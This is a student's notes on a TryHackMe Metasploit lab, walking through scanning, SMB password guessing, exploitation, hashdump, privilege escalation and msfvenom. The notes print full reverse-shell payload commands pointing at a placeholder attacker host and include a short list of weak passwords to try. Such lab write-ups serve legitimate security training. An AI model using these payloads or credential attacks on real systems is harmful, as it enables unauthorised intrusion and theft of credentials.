---

# Metasploit: Exploitation - Try Hack Me room

---

## Objective 

- how to scab target systems using metasploit
- how to use the metasploit database feature
- how to use metasploit to conduct vulnerability scan
- how to use metasploit to expoit vulnerable services on target systems
- how `msfvenom` can be used to create payloads and obtain a meterpreter session on the traget system

- will be using wordlist `/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`

<details>
  
<summary>Scanning</summary>

**Port Scanning**


- Metasploit has number of modules to scan open ports on the target system and network
- `search portscan` can list potential port scanning modules available

<img width="785" height="249" alt="image" src="https://github.com/user-attachments/assets/93c7a8ae-818e-4bd7-91e9-6654fed3fc48" />

- port scanning modules will require us to set a few options

<img width="542" height="362" alt="image" src="https://github.com/user-attachments/assets/65909e71-1307-471f-a991-e189bcc0947c" />

- **concurrency:** number of targets to be scanned simultaneously
- **ports:** port range can be scanned. Metasploit will scan port numbers from 1 to 10000 (nmap scans 1000 most used ports)
- **RHOSTS:** target or target network to be scanned
- **THREADS:** number of threads that will be used simultaneously. more threads = faster scans

---

- can directly perform Nmap scans from the msfconsole prompt faster:

<img width="905" height="227" alt="image" src="https://github.com/user-attachments/assets/47ddc51d-bcb7-417f-b0d8-b5cd61373af6" />

- for information gathering, if you require a speedier approach to port scanning
- metasploit may not be first choice
- a number of modules make metasploit a useful tool for the scanning phase

---
## UDP service Identification

- `scanner/discovery/udp_sweep` module allow us to quickly identify services running the UDP (user datagram protocol)
- this module will not conduct an extensive scan of all possible UDP services
- but does provide a quick way to identify services like DNS or NetBIOS

- we need to set RHOSTS variable to the target IP address to run the UDP scan 

<img width="959" height="308" alt="image" src="https://github.com/user-attachments/assets/c6d86fe7-09cb-471f-b4d6-e3f3573f017d" />

---

## SMB Scans 

- metasploit offers several useful auxiliary modules - allow us to scan specific services
- especially useful in corporate network -> `smb_enumshares` and `smb_version`
- spend some time to identify scanners that the metasploit version installed on your system offers
- again set RHOSTS

- <img width="951" height="311" alt="image" src="https://github.com/user-attachments/assets/fe858646-d140-4eb8-8173-e726b68abe13" />

---
- don't skip 'exotic' services (e.g. NetBIOS) when scaaning -> can reveal useful intel
- NetBIOS = name service similar to SMB, reveals host names that hint at role (e.g. `CORP-DC`, `DEVOPS`, `SALES`)
- NetBIOS/SMB can expose shares (files/folders) - some may be public or protected with weak passwords
- Common weak/share passwords to try: admin, administrator, root, toor, password
- Use Metasploit and other modules to enumerate NetBIOS/SMB (search first for relevant modules)
- Enumeration can lead to attack paths: shared credentials, misconfigurations, or readable sensitive files.
- always run `search type:auxiliary smb` (or `search netbios`) in msfconsole to find helpful modules
- combine scans with targeted (e.g. `nbtscan`, `smbclient`, `smbmap`, `nmap -p 137,139,445 --script=smb-enum-shares`) for deeper insight
- scanning/enumerating targets requires explicit authorisation, don't scan systems we do not own or are not permitted to test

--- 

- How many ports are open on the target system? 5

<img width="433" height="302" alt="image" src="https://github.com/user-attachments/assets/3c50606d-756e-4fb7-a1a3-19ca38dbe5b7" />

---

- using the relevant scanner, what NetBIOS name can we see?acme it support

- <img width="215" height="119" alt="image" src="https://github.com/user-attachments/assets/0b2d597a-123b-463e-ab6e-a27bb9447568" />

- <img width="953" height="236" alt="image" src="https://github.com/user-attachments/assets/0b78a12f-85e6-4d32-b46c-d2e368ebd5bc" />

- <img width="910" height="294" alt="image" src="https://github.com/user-attachments/assets/2c89293f-5ac1-4c25-bc69-39998a952764" />

---

- What is running on port 8000? webfs/1.21

- <img width="893" height="338" alt="image" src="https://github.com/user-attachments/assets/dbfe6844-42cd-4d82-b02f-f0833207cd33" />

---

- What is the "penny" user's SMB password? Use the wordlist /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt : leo1234

- <img width="673" height="43" alt="image" src="https://github.com/user-attachments/assets/96430ea9-4749-4d43-a575-c1a1fb2ac7e0" />

- <img width="947" height="379" alt="image" src="https://github.com/user-attachments/assets/d6ff5202-f878-488f-866e-92f361e3f60e" />

- <img width="712" height="344" alt="image" src="https://github.com/user-attachments/assets/57a3fa0a-8809-4103-93fb-dee35eede725" />

- <img width="686" height="124" alt="image" src="https://github.com/user-attachments/assets/d063a264-42f5-49fe-835e-a667bcb38847" />

</details>

<details>
<summary>The Metasploit Database</summary>

- Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values
- start PostgreSQL before initializing the Metasploit database: `systemctl start postgresql`
- Initialize database (non-root): `sudo -u postgres msfdb init`
- Check database status:`msf6 > db_status` → should show connection to PostgreSQL.
- workspaces isolate projects:

    - List: `workspace`
    - Add: `workspace -a <name>`
    - Delete: `workspace -d <name>`
    - Switch: `workspace <name>`
 
  **Database-Integrated Commands**

- `db_nmap` → run Nmap scans and automatically save results.
- `hosts` → list hosts saved in the database.
- `services` → list detected services.
- `vulns` → list identified vulnerabilities.
- `loot` → list captured data/files.
- `notes` → save additional observations.
- `db_connect/db_disconnect` → manage database connections.
- `db_export/db_import` → save/load scan data.

**workflow example**

1. Scan network with `db_nmap` to find live hosts and services.
2. Save hosts/services in the database.
3. Use modules (e.g., `auxiliary/scanner/smb/smb_ms17_010`) with `hosts -R` to set RHOSTS from saved hosts.
4. Set module options (`show options`) and run module (`run` or `exploit`).
5. Search for services via database:

   - Example: `services -S netbios` → find hosts running NetBIOS.

6. Use Metasploit modules for SMB, HTTP, FTP, SSH, RDP, etc., to find vulnerabilities.

**benefits**

- Centralized information across multiple targets.
- Quickly repeat scans or module executions without manually resetting options.
- Easy identification of high-value targets (HTTP, SMB, FTP, SSH, RDP).
- Organize engagements by workspace to avoid cross-contamination of data.

</details>

<details>
<summary>Vulnerability Scanning</summary>

- Low-hanging fruit: easily exploitable vulnerabilities that can provide quick access or high privileges.
- Scanning & fingerprinting are critical: the better the target is mapped, the more Metasploit options become available.
- Example workflow:

      - Identify running services (e.g., VNC).
      - Use search in Metasploit to list modules for the service.
      - Modules may include payloads, scanners, and post-exploitation tools.
      - Not all modules are immediately useful until a vulnerability is identified

- Focus on scanners first to discover exploitable weaknesses before attempting exploits


  <img width="768" height="377" alt="image" src="https://github.com/user-attachments/assets/9deb31b0-4a2a-4b81-83cb-2739dd69d9ea" />

- can use `info` for any module to have better understanding of its use and purpose

<img width="493" height="445" alt="image" src="https://github.com/user-attachments/assets/fc513cf4-70e7-4c31-a81e-2fd51e53ca14" />

- `vnc_login` module can help us find login details for the VNC service

---

- Who wrote the module that allows us to check SMTP servers for open relay? Campbell Murray

- <img width="938" height="383" alt="image" src="https://github.com/user-attachments/assets/3a28bfe2-426c-4497-9cae-bbbead11329b" />

- <img width="910" height="124" alt="image" src="https://github.com/user-attachments/assets/1caf1c50-6d2d-44fe-9849-9419166b5123" />

- <img width="893" height="374" alt="image" src="https://github.com/user-attachments/assets/5eaeb09b-b521-49cc-860e-137132c6d950" />


</details>

<details>
<summary>Exploittation</summary>

- metasploit version details

<img width="413" height="58" alt="image" src="https://github.com/user-attachments/assets/4d637b98-e449-4cc8-93d9-b71a7d4620ee" />

- can search exploits `search` command
- obtain more info about the exploit using `info`
- and launch the exploit using `exploit`
- a successful output depends on a thorough understanding of services running on the target ssystem

---

- most exploits will have a present default payload
- but we can always use `show payloads` to list other sommands we can use with that specific exploit

<img width="959" height="353" alt="image" src="https://github.com/user-attachments/assets/e4dbf506-41d4-4cb6-b6db-e1344ec2e298" />

- once decided on the payload can use `set payload` to make choice

<img width="947" height="384" alt="image" src="https://github.com/user-attachments/assets/dfcc7c90-8a1d-4d83-a849-d9fb4ef1d71d" />


<img width="434" height="155" alt="image" src="https://github.com/user-attachments/assets/46b18633-eae7-4638-a542-293f094b77d9" />

- choosing a working payload could become a trial and error process
- due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell_reverse_tcp).
- some payloads will open new parameters that we may need to se
- runnong `show options` command once more can show these
- as seen above a reverse paylaod will at least require us to set `LHOST` option

  <img width="770" height="362" alt="image" src="https://github.com/user-attachments/assets/4db6a9cf-0b81-439a-adb1-f54519a4cb3e" />

  - once a session opened we can background it using `CTRL+Z` or abort using `CTRL+C`
  - backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell
 
  <img width="439" height="257" alt="image" src="https://github.com/user-attachments/assets/a80e8b74-8b4f-49a9-8b8b-7afd64b98565" />

---

## working with sessions 

- `sessions` will list all active sessions
- `sessions` supports a number of options that will help you manage sessions better

  <img width="925" height="388" alt="image" src="https://github.com/user-attachments/assets/a8c0255e-0e83-4efd-8067-e32bb4282dea" />

-  can interact with any existing session using `sessions -i` followed session ID

<img width="866" height="286" alt="image" src="https://github.com/user-attachments/assets/2e193266-8fea-456f-924e-a94c838d7002" />

---

**exploit**

- <img width="613" height="364" alt="image" src="https://github.com/user-attachments/assets/97884b01-97ab-4293-8faa-8cc713bbe083" />

- <img width="499" height="385" alt="image" src="https://github.com/user-attachments/assets/ade3c3fd-e429-44cf-97d3-e123b4008013" />

- <img width="791" height="364" alt="image" src="https://github.com/user-attachments/assets/902a202c-6885-45dc-9990-555ad86a7446" />

- <img width="694" height="436" alt="image" src="https://github.com/user-attachments/assets/b1b1a00d-167a-4afb-9c50-e9932e6638c8" />

- now have access to the target and can begin post-exploitation.

**what is the content of the flag.txt?**

- use `search`

- <img width="493" height="146" alt="image" src="https://github.com/user-attachments/assets/ec4ba8f8-1693-4395-b874-38df0018b500" />

- read file `cat`

- <img width="342" height="38" alt="image" src="https://github.com/user-attachments/assets/ff72e0c2-c606-44bb-a06b-c70d0debe3f4" />

**What is the NTLM hash of the password of the user "pirate"?**

- `hashdump` This will dump the SAM database (usernames and their NTLM hashes) from the target Windows machine.

- <img width="556" height="65" alt="image" src="https://github.com/user-attachments/assets/69d3c6e5-a5d2-4852-a4ae-7328f1271ff7" />

---

<img width="580" height="206" alt="image" src="https://github.com/user-attachments/assets/4c84adcc-74cb-4861-8e05-661a2879203f" />


</details>

<details>
<summary>Msfvenom</summary>

- msfvenom allows us to generate payloads
- allows us to access payloads available in the metasploit framework
- allows us to create payloads in many different formats (PHP, exe, dll, elf, etc.)
- and from many different target systems (apple, windows, android, linux etc.)

<img width="493" height="298" alt="image" src="https://github.com/user-attachments/assets/877920ab-9d57-467d-900a-f59eb9c41afc" />

---

**output formats**

- can either generate stand-alone payloads (e.g. Windows executable for Meterpreter) or get usale raw format (e.g. python)
- the `msfvenom --list formats` command can be used to list supported output formats

---

**encoders**

- encoders do not aim to bypass antivirus installed on the target system
- they encode the payload
- it can be effective against some antivirus software, using modern obfuscation techniques
- or learning methods to inject shellcode is a better solution to the problem
- example below shows usage of encoding (`-e` parameter, the PHP version of meterpreter was encoded in Base64, and the output format was raw)

<img width="557" height="149" alt="image" src="https://github.com/user-attachments/assets/59a35bb9-4c49-4d4e-8cbf-5acd3db44ca4" />

---

**handlers**

- similar to exploits using a reverse shell -> need to be able to accept incoming connections generated by MSFvenom payload
- when using exploit module this part is automatically handled by exploit module
- `payload options` title appears when setting reverse shell
- The term commonly used to receive a connection from a target is 'catching a shell'
-  Reverse shells or Meterpreter callbacks generated in our MSFvenom payload can be easily caught using a handler

-> following scenario we will exploit the file upload vulnerability present in DVWA 

--- 

- we will need to replicate a similar scenario on another target system - DVWA used here for illustration purposes
- exploit steps are:
- generate the PHP (A scripting language mostly used for web development.) shell using MSFvenom
- start Metasploit handler
- execute PHP shell

---

- MSFvenom will require a payload, the local machine IP address and the local port to which the payload will connect
- below -> 10.0.2.19 is the IP address of the AttackBox used in the attack and local port 7777 was chosen.

- <img width="434" height="92" alt="image" src="https://github.com/user-attachments/assets/439b0b97-d613-4568-a2bf-0d561612fc9b" />

- <img width="476" height="244" alt="image" src="https://github.com/user-attachments/assets/ffe64061-79c3-4dd2-ada9-0b294ea0f151" />

- <img width="506" height="350" alt="image" src="https://github.com/user-attachments/assets/b2a2f85a-0e34-4616-82be-1ae0fb7cea00" />

- we use multi handler to receive the incoming connection
- `use exploit/multi/handler`
- Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells
- to use this module we need to set payload value (`php/reverse_php`), the LHOST and LPORT values

<img width="379" height="383" alt="image" src="https://github.com/user-attachments/assets/6edb2843-7a51-45e9-8f5a-36337148f24d" />

- once everything set we `run` the handler and wait for incoming connection

<img width="329" height="69" alt="image" src="https://github.com/user-attachments/assets/7f5fb1fd-2b2d-4488-9c8a-6c364a8d0dd8" />

- when the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell
- if payload was set as Meterpreter (e.g. in a windows executable format) multi/handler would then prove us with Meterpreter shell

---

## other payloads

- based on the target system's configuration (operating system, install webserver, installed interpreter etc.)
- msfvenom can be used to create payloads in almost all formats

- below are a few examples we will often use:

     - in all these examples LHOST  = IP address of our attacking machine and LPORT = port on whoch our handler will listen
 
 
**Linux Executable and Linkable Format (elf)**

- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
- .elf format is comparable to the .exe format in Windows -> are executable files for Linux
- but may still need to make sure they have executable permissions on the target machine
- e.g. once we have the shell.elf file on our target machine, use the chmod +x shell.elf command to accord executable permissions
- once done we can run this file by typing ./shell.elf on target machine command line

**windows**

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`

**PHP**

- `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`

**ASP**

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`

**python**

- `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

- all examples above are reverse payloads
- means we will need to have the exploit/multi/handler module listening on our attacking machine to work as a handler
- will need to set up the handler accordingly with the payload, LHOST and LPORT parameters
- these values will be same we have used when creating msfvenom payload

---

- <img width="102" height="93" alt="image" src="https://github.com/user-attachments/assets/b725f443-6404-4669-bb34-b8b921c6f550" />


- first we switch user to murphy and login in -> use whoami to confirm

- <img width="205" height="83" alt="image" src="https://github.com/user-attachments/assets/548d6354-530a-476c-9ac2-3df5ba58bfbd" />

- get a root shell `sudo su`, can see we have successfuly escalated to root privileges

- <img width="133" height="70" alt="image" src="https://github.com/user-attachments/assets/edc96a35-7104-4761-b2c5-82e26517aeff" />

 - we have just performed a privilege escalation attack

---

- <img width="92" height="68" alt="image" src="https://github.com/user-attachments/assets/05eb211e-c411-4c6d-86a6-e0a7fe67050e" />

- switching to the attackbox actually logs us out on the metasploitMSFVENOM-badr

- <img width="331" height="233" alt="image" src="https://github.com/user-attachments/assets/1343deb8-9dd1-4de4-a4d7-3f569a46ff1e" />

- once logged in we get root shell (use `sudo su` to escalate privileges)

- <img width="122" height="36" alt="image" src="https://github.com/user-attachments/assets/776eca1d-a36f-4b4c-b108-a75ffa121bbd" />

- now we Create a meterpreter payload in the .elf format for the Linux system
- first switch tab
- LHOST=attackbox ip (at top of terminal)
- LPORT whatever you like

- <img width="330" height="158" alt="image" src="https://github.com/user-attachments/assets/e826700e-042b-46bf-bb0a-5ef0ec0e4653" />

- now elf file has been created

---

- <img width="98" height="131" alt="image" src="https://github.com/user-attachments/assets/26bde24a-8c63-4c85-adf3-714e62a7b57f" />

- start the http server from which the attack machine will download the elf file
- can see it below the full directory listeing through the http server from the listening host in this case the attackbox

- <img width="336" height="337" alt="image" src="https://github.com/user-attachments/assets/ebe2cb97-8483-47bf-a16e-0ad624cf88e1" />

- this is how we get the elf file on the attack machine 

- <img width="328" height="106" alt="image" src="https://github.com/user-attachments/assets/553984ab-4b53-44e3-a276-bae6d647dc7b" />

- can see we successfully downloaded the file 

- start the meteploit handler start by `msfconsole`

- <img width="326" height="242" alt="image" src="https://github.com/user-attachments/assets/674a3582-6ba5-4674-a50a-86867c99a515" />

- first we go to the correct module then we set the payload then we set lhost (attackbox ip) then the port (same as port we used when creating meterpreter payload) then did `show options` to check what we had just set 

- exploit failed so we try different port

- <img width="332" height="74" alt="image" src="https://github.com/user-attachments/assets/6fdc02b0-62e3-4bdc-9039-fdad17cbb82c" />

- <img width="328" height="98" alt="image" src="https://github.com/user-attachments/assets/8c151979-1c54-4f9f-a5a2-d6dce0734499" />

- <img width="314" height="95" alt="image" src="https://github.com/user-attachments/assets/0f591c8f-8489-4ce3-b952-383998dc3a72" />

- <img width="329" height="176" alt="image" src="https://github.com/user-attachments/assets/e4af5161-e252-4eae-8e95-947c7186ce2e" />

- run started successfully

- <img width="245" height="35" alt="image" src="https://github.com/user-attachments/assets/062bbd5c-8b71-4b84-8cc1-94173d49cdf0" />

- <img width="302" height="75" alt="image" src="https://github.com/user-attachments/assets/4c402634-d769-4d13-87f4-e9f31b7e66e7" />

- change mod on attack then switch back see session has opened (Get a meterpreter session on the target machine. is completed)

- <img width="323" height="68" alt="image" src="https://github.com/user-attachments/assets/d8666674-14cb-411c-8c21-27ad92db52c5" />

- `ls` see files on target machine

- <img width="319" height="182" alt="image" src="https://github.com/user-attachments/assets/57c84ddc-de57-4b7a-84da-5e85e0d4f5d5" />

- we  are asked to  post exploitation module to dump hashes of other users on the system

- <img width="131" height="41" alt="image" src="https://github.com/user-attachments/assets/207a0191-efc5-4406-ac40-6585ac2ae5b3" />

- <img width="335" height="77" alt="image" src="https://github.com/user-attachments/assets/170131b6-4795-45a3-98cb-e78326d8b668" />

- <img width="481" height="305" alt="image" src="https://github.com/user-attachments/assets/28829b30-5238-4725-9f91-16e01fd52bcf" />

</details>

---

## Summary 

- better understanding of how Metasploit can help you identify potential vulnerabilities on target systems and exploit these vulnerabilities
- seen how the database feature can help you with penetration testing engagements where you have multiple potential targets
- gained some experience with msfvenom and the creation of stand-alone Meterpreter payloads -> especially helpful in situations where you can upload a file to the target system or have the ability to download files to the target system
